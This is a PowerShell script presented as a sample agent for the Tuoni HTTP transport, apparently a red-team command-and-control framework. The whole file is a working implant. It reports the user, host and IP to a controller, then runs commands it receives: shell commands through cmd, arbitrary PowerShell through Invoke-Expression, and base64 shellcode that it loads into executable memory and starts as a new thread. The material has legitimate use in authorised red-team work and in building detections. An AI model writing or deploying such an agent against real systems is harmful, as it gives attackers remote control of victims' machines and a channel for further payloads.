# PowerShell sample agent for the Tuoni external HTTP transport.
#
# Usage:
#   powershell -File agent.ps1 <controller_host> <controller_port>

param(
    [Parameter(Mandatory=$true, Position=0)]
    [string]$ControllerHost,

    [Parameter(Mandatory=$true, Position=1)]
    [int]$ControllerPort
)

$serverUrl = "http://${ControllerHost}:${ControllerPort}/"
$guid = [guid]::NewGuid().ToString()
$sleepInterval = 2
$commandResult = $null
$username = [Environment]::UserName
$hostname = $env:COMPUTERNAME
$agentOs = "WINDOWS"
$processArch = if ([Environment]::Is64BitProcess) { "x64" } else { "x86" }
$agentIps = try {
    (Get-NetIPAddress -AddressFamily IPv4 -Type Unicast -ErrorAction SilentlyContinue |
        Where-Object { $_.IPAddress -ne "127.0.0.1" } |
        Select-Object -First 1).IPAddress
} catch { $null }

Write-Host "[agent] id=$guid, polling $serverUrl every ${sleepInterval}s"

while ($true) {
    try {
        $data = @{
            id          = $guid
            type        = "powershell"
            username    = $username
            hostname    = $hostname
            os          = $agentOs
            processArch = $processArch
            ips         = $agentIps
        }
        if ($null -ne $commandResult) {
            $data["result"] = $commandResult
        }

        $json = $data | ConvertTo-Json -Depth 4
        $response = Invoke-WebRequest -Uri $serverUrl -Method Post -Body $json -ContentType "application/json" -UseBasicParsing -TimeoutSec 10
        $responseData = $response.Content | ConvertFrom-Json

        $commandResult = $null
        if ($null -eq $responseData -or -not ($responseData.PSObject.Properties.Name -contains "__type__")) {
            Start-Sleep -Seconds $sleepInterval
            continue
        }

        $cmdType = $responseData.__type__
        Write-Host "[agent] Received command: $cmdType"

        switch ($cmdType) {
            "my_what" {
                $commandResult = "I'm a PowerShell agent"
            }
            "my_sleep" {
                $sleepInterval = [int]$responseData.sleep
                Write-Host "[agent] Sleep changed to ${sleepInterval}s"
                $commandResult = "New sleep is $sleepInterval"
            }
            "my_terminal" {
                $cmd = $responseData.command
                Write-Host "[agent] Running: $cmd"
                $output = & cmd /c $cmd 2>&1
                $commandResult = [string]::Join("`n", $output)
            }
            "my_spawn" {
                if (-not ([System.Management.Automation.PSTypeName]'Win32Spawn').Type) {
                    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Win32Spawn {
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr a, uint st, IntPtr fn, IntPtr p, uint f, IntPtr tid);
}
"@
                }
                $bytes = [Convert]::FromBase64String($responseData.shellcode)
                $addr = [Win32Spawn]::VirtualAlloc([IntPtr]::Zero, [uint32]$bytes.Length, 0x3000, 0x40)
                if ($addr -eq [IntPtr]::Zero) {
                    $commandResult = "VirtualAlloc failed for $($bytes.Length) bytes"
                } else {
                    [System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $addr, $bytes.Length)
                    [Win32Spawn]::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null
                    $commandResult = "spawned thread for $($bytes.Length) bytes shellcode"
                }
            }
            "my_eval" {
                $commandResult = [string](Invoke-Expression $responseData.code)
            }
            default {
                $commandResult = "Unknown command type: $cmdType"
            }
        }
    } catch {
        Write-Host "[agent] Error: $($_.Exception.Message)"
        if ($null -eq $commandResult) {
            $commandResult = $_.Exception.Message
        }
    }
    Start-Sleep -Seconds $sleepInterval
}
